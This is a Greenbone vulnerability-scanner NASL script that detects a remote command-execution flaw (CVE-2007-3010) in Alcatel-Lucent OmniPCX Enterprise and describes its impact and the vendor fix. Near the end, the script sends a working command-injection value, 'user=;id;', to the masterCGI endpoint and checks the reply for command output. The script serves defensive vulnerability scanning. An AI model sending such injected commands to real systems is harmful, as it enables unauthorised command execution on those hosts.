# SPDX-FileCopyrightText: 2012 Greenbone AG
# Some text descriptions might be excerpted from (a) referenced
# source(s), and are Copyright (C) by the respective right holder(s).
#
# SPDX-License-Identifier: GPL-2.0-only

if (description)
{
  script_oid("1.3.6.1.4.1.25623.1.0.103480");
  script_xref(name:"CISA", value:"Known Exploited Vulnerability (KEV) catalog");
  script_xref(name:"URL", value:"https://www.cisa.gov/known-exploited-vulnerabilities-catalog");
  script_cve_id("CVE-2007-3010");
  script_tag(name:"cvss_base", value:"10.0");
  script_tag(name:"cvss_base_vector", value:"AV:N/AC:L/Au:N/C:C/I:C/A:C");
  script_version("2024-07-04T05:05:37+0000");

  script_name("Alcatel-Lucent OmniPCX Enterprise RCE Vulnerability");

  script_xref(name:"URL", value:"http://www.securityfocus.com/bid/25694");
  script_xref(name:"URL", value:"http://www1.alcatel-lucent.com/enterprise/en/products/ip_telephony/omnipcxenterprise/index.html");
  script_xref(name:"URL", value:"http://www.securityfocus.com/archive/1/479699");
  script_xref(name:"URL", value:"http://www1.alcatel-lucent.com/psirt/statements/2007002/OXEUMT.htm");

  script_tag(name:"last_modification", value:"2024-07-04 05:05:37 +0000 (Thu, 04 Jul 2024)");
  script_tag(name:"severity_vector", value:"CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H");
  script_tag(name:"severity_origin", value:"NVD");
  script_tag(name:"severity_date", value:"2024-07-02 17:43:30 +0000 (Tue, 02 Jul 2024)");
  script_tag(name:"creation_date", value:"2012-04-26 13:55:46 +0200 (Thu, 26 Apr 2012)");
  script_category(ACT_ATTACK);
  script_tag(name:"qod_type", value:"remote_vul");
  script_family("Web application abuses");
  script_copyright("Copyright (C) 2012 Greenbone AG");
  script_dependencies("find_service.nasl", "httpver.nasl", "global_settings.nasl");
  script_require_ports("Services/www", 80);
  script_exclude_keys("Settings/disable_cgi_scanning");
  script_tag(name:"solution", value:"The vendor has released an advisory along with fixes to address this
issue. Please see the referenced advisory for information on
obtaining fixes.");
  script_tag(name:"summary", value:"Alcatel-Lucent OmniPCX Enterprise is prone to a remote command-
execution vulnerability because it fails to adequately sanitize user-
supplied data.");

  script_tag(name:"impact", value:"Attackers can exploit this issue to execute arbitrary commands with
the privileges of the 'httpd' user. Successful attacks may facilitate
a compromise of the application and underlying webserver, other
attacks are also possible.");

  script_tag(name:"affected", value:"Alcatel-Lucent OmniPCX Enterprise R7.1 and prior versions are
vulnerable to this issue.");

  script_tag(name:"solution_type", value:"VendorFix");
  exit(0);
}

include("http_func.inc");
include("http_keepalive.inc");
include("port_service_func.inc");

port = http_get_port(default:80);

url = "/index.html";
buf = http_get_cache(port:port, item:url);

if("<title>OmniPCX" >< buf) {

  url = '/cgi-bin/masterCGI?ping=nomip&user=;id;';

  if(http_vuln_check(port:port, url:url,pattern:"uid=[0-9]+.*gid=[0-9]+.*",check_header:TRUE)) {
    security_message(port:port);
    exit(0);
  } else {
    exit(99);
  }
}

exit(0);
